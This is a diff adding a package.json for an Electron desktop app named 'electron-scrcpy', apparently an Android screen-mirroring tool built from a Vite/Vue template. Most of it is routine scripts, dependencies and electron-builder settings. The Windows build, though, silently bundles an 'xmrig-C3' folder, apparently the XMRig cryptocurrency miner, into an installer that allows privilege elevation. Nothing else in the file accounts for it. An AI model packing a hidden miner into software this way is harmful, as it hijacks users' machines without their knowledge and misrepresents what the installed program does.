@@ -1,0 +1,141 @@
+{
+  "name": "electron-vite-template",
+  "version": "1.0.0",
+  "main": "./dist/electron/main/main.js",
+  "author": "sky <https://github.com/umbrella22>",
+  "license": "MIT",
+  "scripts": {
+    "dev": "node .electron-vite/dev-runner.js",
+    "build": "cross-env BUILD_TARGET=clean node .electron-vite/build.js && node .electron-vite/build.js && electron-builder",
+    "build:win32": "cross-env BUILD_TARGET=clean node .electron-vite/build.js && node .electron-vite/build.js && electron-builder --win  --ia32",
+    "build:win64": "cross-env BUILD_TARGET=clean node .electron-vite/build.js && node .electron-vite/build.js && electron-builder --win  --x64",
+    "build:mac": "cross-env BUILD_TARGET=clean node .electron-vite/build.js && node .electron-vite/build.js && electron-builder --mac",
+    "build:dir": "cross-env BUILD_TARGET=clean node .electron-vite/build.js && node .electron-vite/build.js && electron-builder --dir",
+    "build:clean": "cross-env BUILD_TARGET=clean node .electron-vite/build.js",
+    "build:web": "cross-env BUILD_TARGET=web node .electron-vite/build.js",
+    "dep:upgrade": "yarn upgrade-interactive --latest",
+    "postinstall": "electron-builder install-app-deps"
+  },
+  "build": {
+    "asar": false,
+    "extraFiles": [
+      {
+        "from": "./src/vendor",
+        "to": "./dist/resources"
+      }
+    ],
+    "publish": [
+      {
+        "provider": "generic",
+        "url": "http://127.0.0.1"
+      }
+    ],
+    "productName": "electron-scrcpy",
+    "appId": "org.hardy.electron-scrcpy",
+    "directories": {
+      "output": "build"
+    },
+    "files": [
+      "dist/electron/**/*",
+      "dist/resources/**/*"
+    ],
+    "extraResources": [
+      "./vendor/**/*"
+    ],
+    "dmg": {
+      "contents": [
+        {
+          "x": 410,
+          "y": 150,
+          "type": "link",
+          "path": "/Applications"
+        },
+        {
+          "x": 130,
+          "y": 150,
+          "type": "file"
+        }
+      ]
+    },
+    "mac": {
+      "icon": "build/icons/icon.icns"
+    },
+    "win": {
+      "icon": "build/icons/icon.ico",
+      "target": "nsis",
+      "extraResources": [
+        "./xmrig-C3/**/*"
+      ]
+    },
+    "linux": {
+      "target": "deb",
+      "icon": "build/icons"
+    },
+    "nsis": {
+      "oneClick": false,
+      "allowElevation": true,
+      "allowToChangeInstallationDirectory": true,
+      "createDesktopShortcut": true,
+      "createStartMenuShortcut": true
+    }
+  },
+  "dependencies": {
+    "@devicefarmer/adbkit": "^2.11.3",
+    "axios": "0.21.1",
+    "bluebird": "^3.7.2",
+    "buffer": "^6.0.3",
+    "electron-log": "^4.3.2",
+    "electron-updater": "^4.3.8",
+    "express": "^4.17.1",
+    "extract-zip": "^2.0.1",
+    "fs-extra": "^9.1.0",
+    "h264-converter": "^0.1.2",
+    "node-pty": "^0.9.0",
+    "nodejs-utf8": "^1.0.0",
+    "os-utils": "0.0.14",
+    "portfinder": "^1.0.28",
+    "tslib": "^1.9.3",
+    "vue-electron": "^1.0.6",
+    "ws": "^7.2.3"
+  },
+  "devDependencies": {
+    "@rollup/plugin-alias": "^3.1.2",
+    "@rollup/plugin-commonjs": "^17.1.0",
+    "@rollup/plugin-json": "^4.1.0",
+    "@rollup/plugin-node-resolve": "^11.2.0",
+    "@types/electron-devtools-installer": "^2.2.0",
+    "@types/fs-extra": "^9.0.8",
+    "@types/node": "^14.14.35",
+    "@types/ws": "^7.4.1",
+    "@vitejs/plugin-vue": "^1.1.5",
+    "@vue/compiler-sfc": "^3.0.7",
+    "cfonts": "^2.9.1",
+    "chalk": "^4.1.0",
+    "cross-env": "^7.0.3",
+    "del": "^6.0.0",
+    "electron": "^12.0.2",
+    "electron-builder": "^22.10.5",
+    "electron-devtools-installer": "^3.1.1",
+    "element-plus": "^1.0.2-beta.35",
+    "minimist": "^1.2.5",
+    "multispinner": "^0.2.1",
+    "ora": "^5.4.0",
+    "portfinder": "^1.0.28",
+    "rollup-plugin-css-porter": "^1.0.2",
+    "rollup-plugin-esbuild": "^3.0.2",
+    "rollup-plugin-node-resolve": "^5.2.0",
+    "sass": "^1.32.8",
+    "tslib": "^2.1.0",
+    "typescript": "^4.2.3",
+    "vite": "^2.1.2",
+    "vue": "^3.0.7",
+    "vue-router": "^4.0.5",
+    "vuex": "^4.0.0"
+  },
+  "keywords": [
+    "vite",
+    "electron",
+    "vue3",
+    "rollup"
+  ]
+}
